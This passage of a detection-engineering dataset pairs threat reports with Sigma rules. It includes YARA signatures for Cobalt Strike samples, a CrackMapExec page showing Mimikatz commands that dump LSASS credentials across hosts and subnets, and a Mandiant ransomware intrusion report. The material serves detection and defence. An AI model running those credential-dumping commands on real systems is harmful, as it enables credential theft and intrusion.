temp.sqlite_parameters(key,value)VALUES(%Q,%s);\" fullword ascii\n$s11 = \"error in %s %s%s%s: %s\" fullword ascii\n$s12 = \"UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view\" ascii\n$s13 = \"BBBBBBBBBBBBBBBBBBBB\" wide /* reversed goodware string 'BBBBBBBBBBBBBBBBBBBB' */\n$s14 = \"UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view\" ascii\n$s15 = \");CREATE TEMP TABLE _shell$self;\" fullword ascii\n$s16 = \"SqlExec\" fullword ascii\n$s17 = \"* If neither --csv or --ascii are used, the input mode is derived\" fullword ascii\n$s18 = \"Where sub-commands are:\" fullword ascii\n$s19 = \"max rootpage (%d) disagrees with header (%d)\" fullword ascii\n$s20 = \"-- Query %d --------------------------------\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 4000KB and\n( pe.imphash() == \"67f1f64a3db0d22bf48121a6cea1da22\" or 8 of them )\n}\n\nrule sig_4641_62 {\nmeta:\ndescription = \"4641 - file 62.dll\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-08-02\"\nhash1 = \"8b9d605b826258e07e63687d1cefb078008e1a9c48c34bc131d7781b142c84ab\"\nstrings:\n$s1 = \"Common causes completion include incomplete download and damaged media\" fullword ascii\n$s2 = \"An error occurred writing to the file\" fullword ascii\n$s3 = \"asks should be performed?\" fullword ascii\n$s4 = \"The waiting time for the end of the launch was exceeded for an unknown reason\" fullword ascii\n$s5 = \"Select the Start Menu folder in which you would like Setup to create the programs shortcuts, then click Next. Which additional t\" ascii\n$s6 = \"HcA<E3\" fullword ascii /* Goodware String - occured 1 times */\n$s7 = \"Select the Start Menu folder in which you would like Setup to create the programs shortcuts, then click Next. Which additional t\" ascii\n$s8 = \"D$(9D$@u\" fullword ascii /* Goodware String - occured 1 times */\n$s9 = \"Please verify that the correct path and file name are given\" fullword ascii\n$s10 = \"Critical error\" fullword ascii\n$s11 = \"Please read this information carefully\" fullword ascii\n$s12 = \"Unknown error occurred for time: \" fullword ascii\n$s13 = \"E 3y4i\" fullword ascii\n$s14 = \"D$tOuo2\" fullword ascii\n$s15 = \"D$PH9D$8tXH\" fullword ascii\n$s16 = \"E$hik7\" fullword ascii\n$s17 = \"D$p]mjk\" fullword ascii\n$s18 = \"B):0~\\\"Z\" fullword ascii\n$s19 = \"Richo/\" fullword ascii\n$s20 = \"D$xJij\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 70KB and\n( pe.imphash() == \"42205b145650671fa4469a6321ccf8bf\" and pe.exports(\"StartW\") or 8 of them )\n}\n\nrule sig_4641_tdrE934 {\nmeta:\ndescription = \"4641 - file tdrE934.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-08-02\"\nhash1 = \"48f2e2a428ec58147a4ad7cc0f06b3cf7d2587ccd47bad2ea1382a8b9c20731c\"\nstrings:\n$s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s2 = \"D:\\\\1W7w3cZ63gF\\\\wFIFSV\\\\YFU1GTi1\\\\i5G3cr\\\\Wb2f\\\\Cvezk3Oz\\\\2Zi9ir\\\\S76RW\\\\RE5kLijcf.pdb\" fullword ascii\n$s3 = \"https://sectigo.com/CPS0\" fullword ascii\n$s4 = \"2http://crl.comodoca.com/AAACertificateServices.crl04\" fullword ascii\n$s5 = \"?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v\" fullword ascii\n$s6 = \"3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%\" fullword ascii\n$s7 = \"ntdll.dlH\" fullword ascii\n$s8 = \"http://ocsp.sectigo.com0\" fullword ascii\n$s9 = \"2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s\" fullword ascii\n$s10 = \"2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#\" fullword ascii\n$s11 = \"tmnEt6XElyFyz2dg5EP4TMpAvGdGtork5EZcpw3eBwJQFABWlUZa5slcF6hqfGb2HgPed49gr2baBCLwRel8zM5cbMfsrOdS1yd6bMpepebebyT4NIN6zOvk\" fullword ascii\n$s12 = \"ealagi@aol.com0\" fullword ascii\n$s13 = \"operator co_await\" fullword ascii\n$s14 = \"ZGetModuleHandle\" fullword ascii\n$s15 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s16 = \"RtlExitUserThrea`NtFlushInstruct\" fullword ascii\n$s17 = \"UAWAVAUATVWSH\" fullword ascii\n$s18 = \"AWAVAUATVWUSH\" fullword ascii\n$s19 = \"AWAVVWSH\" fullword ascii\n$s20 = \"UAWAVATVWSH\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 2000KB and\n( pe.imphash() == \"4f1ec786c25f2d49502ba19119ebfef6\" or 8 of them )\n}\n\nrule sig_4641_netscan {\nmeta:\ndescription = \"4641 - file netscan.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-08-02\"\nhash1 = \"bb574434925e26514b0daf56b45163e4c32b5fc52a1484854b315f40fd8ff8d2\"\nstrings:\n$s1 = \"netscan.exe\" fullword ascii\n$s2 = \"TFMREMOTEPOWERSHELL\" fullword wide\n$s3 = \"TFMREMOTEPOWERSHELLEDIT\" fullword wide\n$s4 = \"TFMBASEDIALOGREMOTEEDIT\" fullword wide\n$s5 = \"*http://crl4.digicert.com/assured-cs-g1.crl0L\" fullword ascii\n$s6 = \"*http://crl3.digicert.com/assured-cs-g1.crl00\" fullword ascii\n$s7 = \"TFMIGNOREADDRESS\" fullword wide\n$s8 = \"TREMOTECOMMONFORM\" fullword wide\n$s9 = \"TFMSTOPSCANDIALOG\" fullword wide\n$s10 = \"TFMBASEDIALOGSHUTDOWN\" fullword wide\n$s11 = \"TFMBASEDIALOG\" fullword wide\n$s12 = \"TFMOFFLINEDIALOG\" fullword wide\n$s13 = \"TFMLIVEDISPLAYLOG\" fullword wide\n$s14 = \"TFMHOSTPROPS\" fullword wide\n$s15 = \"GGG`BBB\" fullword ascii /* reversed goodware string 'BBB`GGG' */\n$s16 = \"SoftPerfect Network Scanner\" fullword wide\n$s17 = \"TUSERPROMPTFORM\" fullword wide\n$s18 = \"TFMREMOTESSH\" fullword wide\n$s19 = \"TFMREMOTEGROUPSEDIT\" fullword wide\n$s20 = \"TFMREMOTEWMI\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 6000KB and\n( pe.imphash() == \"573e7039b3baff95751bded76795369e\" and ( pe.exports(\"__dbk_fcall_wrapper\") and pe.exports(\"dbkFCallWrapperAddr\") ) or 8 of them )\n}\n\nrule sig_4641_tdr615 {\nmeta:\ndescription = \"4641 - file tdr615.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-08-02\"\nhash1 = \"12761d7a186ff14dc55dd4f59c4e3582423928f74d8741e7ec9f761f44f369e5\"\nstrings:\n$s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s2 = \"I:\\\\RoDcnyLYN\\\\k1GP\\\\ap0pivKfOF\\\\odudwtm30XMz\\\\UnWdqN\\\\01\\\\7aXg1kTkp.pdb\" fullword ascii\n$s3 = \"https://sectigo.com/CPS0\" fullword ascii\n$s4 = \"2http://crl.comodoca.com/AAACertificateServices.crl04\" fullword ascii\n$s5 = \"?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v\" fullword ascii\n$s6 = \"3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%\" fullword ascii\n$s7 = \"http://ocsp.sectigo.com0\" fullword ascii\n$s8 = \"2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s\" fullword ascii\n$s9 = \"2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#\" fullword ascii\n$s10 = \"ealagi@aol.com0\" fullword ascii\n$s11 = \"operator co_await\" fullword ascii\n$s12 = \"GetModuleHandleRNtUnmapViewOfSe\" fullword ascii\n$s13 = \"+GetProcAddress\" fullword ascii\n$s14 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n$s15 = \"RtlExitUserThrebNtFlushInstruct\" fullword ascii\n$s16 = \"Sectigo Limited1$0\\\"\" fullword ascii\n$s17 = \"b<log10\" fullword ascii\n$s18 = \"D*&W -\" fullword ascii\n$s19 = \"WINDOWSPROJECT1\" fullword wide\n$s20 = \"WindowsProject1\" fullword wide\ncondition:\nuint16(0) == 0x5a4d and filesize < 10000KB and\n( pe.imphash() == \"555560b7871e0ba802f2f6fbf05d9bfa\" or 8 of them )\n}\n\nrule CS_DLL {\nmeta:\ndescription = \"62.dll\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-07\"\nhash1 = \"8b9d605b826258e07e63687d1cefb078008e1a9c48c34bc131d7781b142c84ab\"\nstrings:\n$s1 = \"Common causes completion include incomplete download and damaged media\" fullword ascii\n$s2 = \"StartW\" fullword ascii\n$s4 = \".rdata$zzzdbg\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 70KB and ( pe.imphash() == \"42205b145650671fa4469a6321ccf8bf\" )\nor (all of them)\n}\n\nrule tdr615_exe {\nmeta:\ndescription = \"Cobalt Strike on beachhead: tdr615.exe\"\nauthor = \"The DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-07\"\nhash1 = \"12761d7a186ff14dc55dd4f59c4e3582423928f74d8741e7ec9f761f44f369e5\"\nstrings:\n$a1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$a2 = \"I:\\\\RoDcnyLYN\\\\k1GP\\\\ap0pivKfOF\\\\odudwtm30XMz\\\\UnWdqN\\\\01\\\\7aXg1kTkp.pdb\" fullword ascii\n$b1 = \"ealagi@aol.com0\" fullword ascii\n$b2 = \"operator co_await\" fullword ascii\n$b3 = \"GetModuleHandleRNtUnmapViewOfSe\" fullword ascii\n$b4 = \"RtlExitUserThrebNtFlushInstruct\" fullword ascii\n$c1 = \"Jersey City1\" fullword ascii\n$c2 = \"Mariborska cesta 971\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 10000KB and\nany of ($a* ) and 2 of ($b* ) and any of ($c* )\n}\n```\n\n## MITRE\n\n- **Phishing: Spearphishing Attachment** – T1566.001\n- **Signed Binary Proxy Execution: Regsvr32** – T1218.010\n- **Impair Defenses: Disable or Modify Tools** – T1562.001\n- **Domain Trust Discovery** – T1482\n- **OS Credential Dumping: LSASS Memory** – T1003.001\n- **System Owner/User Discovery** – T1033\n- **Command and Scripting Interpreter: PowerShell** – T1059.001\n- **Data Staged: Local Data Staging** – T1074.001\n- **System Information Discovery** – T1082\n- **Account Discovery: Local Account** – T1087.001\n- **Account Discovery: Domain Account** – T1087.002\n- **OS Credential Dumping: NTDS** – T1003.003\n- **Windows Management Instrumentation** – T1047\n- **Browser Bookmark Discovery** – T1217\n- **Data Encrypted for Impact** – T1486\n- **Remote Services: SMB/Windows Admin Shares** – T1021.002\n\n## MITRE Software\n\n- **AdFind** – S0552\n- **BloodHound** – S0521\n- **Cobalt Strike** – S0154\n- **Systeminfo** – S0096\n- **Net** – S0039\n- **Nltest** – S0359\n- **Esentutl** – S0404\n- **PsExec** – S0029\n- **Cmd** – S0106\n\n## References\n\n- TrickBot Malware Alert (AA21-076A), US CERT\n- Advisory: Trickbot, NCSC\n- Trickbot Still Alive and Well, The DFIR Report\n- Hunting for GetSystem in offensive security tools, RedCanary\n- TrickBot Banking Trojan, ThreatPost",
    "sigma_rule": {
      "title": "Esentutl Gather Credentials",
      "id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
      "status": "test",
      "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
      "references": [
        "https://twitter.com/vxunderground/status/1423336151860002816",
        "https://attack.mitre.org/software/S0404/",
        "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
      ],
      "author": "sam0x90",
      "date": "2021-08-06",
      "modified": "2022-10-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "esentutl",
            " /p"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "User",
        "CommandLine",
        "ParentCommandLine",
        "CurrentDirectory"
      ],
      "falsepositives": [
        "To be determined"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_params.yml"
  },
  "46": {
    "url": "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
    "markdown": "# CrackMapExec Mimikatz (mssql)\n\nThis page contains detailed information about how to use the **mimikatz** CME module while using the **mssql** protocol. For a list of all CrackMapExec modules, visit the CrackMapExec Module Library.\n\n## Description\n\n---\n\nThis module executes PowerSploit's `Invoke-Mimikatz.ps1` script (Mimikatz's DPAPI Module) and extracts cached credentials from memory from the LSASS subsystem. In essence, it executes `privilege::debug` and `sekurlsa::logonpasswords` Mimikatz commands.\n\nThe mimikatz module is OPSEC safe. This means that it doesn't touch the disk and therefore shouldn't trigger any alarms.\n\n## Supported Protocols\n\n---\n\n- mssql\n- smb\n\n## Module Source Code\n\n---\n\n- https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules/mimikatz.py\n\n## Authors\n\n---\n\n- @byt3bl33d3r\n\n## Module Options\n\n---\n\nAs you can see below, the mimikatz module has one option:\n\n```\n# cme mssql -M mimikatz --options\n[*] mimikatz module options:\n\n           COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')\n```\n\nNote that this option is not required. If you want to change the default value, you can do so by appending **-o COMMAND=VALUE** parameter to the command line.\n\n## Module Usage\n\n---\n\nThis is how to use the mimikatz module while using the mssql protocol:\n\n```\nSyntax:\n# cme mssql <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M mimikatz\n\nAdmin user:\n# cme mssql 10.0.5.1 -u sa -p P@ss123 -d . -M mimikatz\n# cme mssql 10.0.5.1 -u sa -p P@ss123 --local-auth -M mimikatz\n\nNormal user:\n# cme mssql 10.0.5.1 -u dbuser -p P@ss123 -d target.corp -M mimikatz\n```\n\nCrackMapExec also supports passing the hash, so you can specify NTLM hash instead of a password:\n\n```\n# cme mssql 10.0.5.1 -u sa -H 432b022dc22aa5afe884e986b8383ff2 -d . -M mimikatz\n# cme mssql 10.0.5.1 -u dbuser -H 432b022dc22aa5afe884e986b8383ff2 -d target.corp -M mimikatz\n```\n\nThe mimikatz module can also be used against multiple hosts. Here's how to run it against multiple hosts:\n\n```\n# cme mssql target_list.txt -u sa -p P@ss123 -d . -M mimikatz\n# cme mssql 10.0.5.0/24 -u sa -p P@ss123 -d . -M mimikatz\n# cme mssql 10.0.5.1-100 -u sa -p P@ss123 -d . -M mimikatz\n```\n\n## References\n\n---\n\n- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1\n- https://github.com/gentilkiwi/mimikatz\n\n## Version\n\n---\n\nThis page has been created based on CrackMapExec version 5.1.7dev.\nVisit CrackMapExec Module Library for more modules.",
    "sigma_rule": {
      "title": "HackTool - CrackMapExec Execution",
      "id": "42a993dd-bb3e-48c8-b372-4d6684c4106c",
      "status": "test",
      "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
      "references": [
        "https://web.archive.org/web/20220625234519/https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local",
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz",
        "https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "modified": "2023-03-08",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.credential-access",
        "attack.discovery",
        "attack.t1047",
        "attack.t1053",
        "attack.t1059.003",
        "attack.t1059.001",
        "attack.t1110",
        "attack.t1201"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_binary": {
          "Image|endswith": "\\crackmapexec.exe"
        },
        "selection_special": {
          "CommandLine|contains": " -M pe_inject "
        },
        "selection_execute": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -x "
          ]
        },
        "selection_hash": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p ",
            " -H 'NTHASH'"
          ]
        },
        "selection_module_mssql": {
          "CommandLine|contains|all": [
            " mssql ",
            " -u ",
            " -p ",
            " -M ",
            " -d "
          ]
        },
        "selection_module_smb1": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -H ",
            " -M ",
            " -o "
          ]
        },
        "selection_module_smb2": {
          "CommandLine|contains|all": [
            " smb ",
            " -u ",
            " -p ",
            " --local-auth"
          ]
        },
        "part_localauth_1": {
          "CommandLine|contains|all": [
            " --local-auth",
            " -u ",
            " -p "
          ]
        },
        "part_localauth_2": {
          "CommandLine|contains|all": [
            " 10.",
            " 192.168.",
            "/24 "
          ]
        },
        "condition": "1 of selection_* or all of part_localauth*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_execution.yml"
  },
  "47": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY 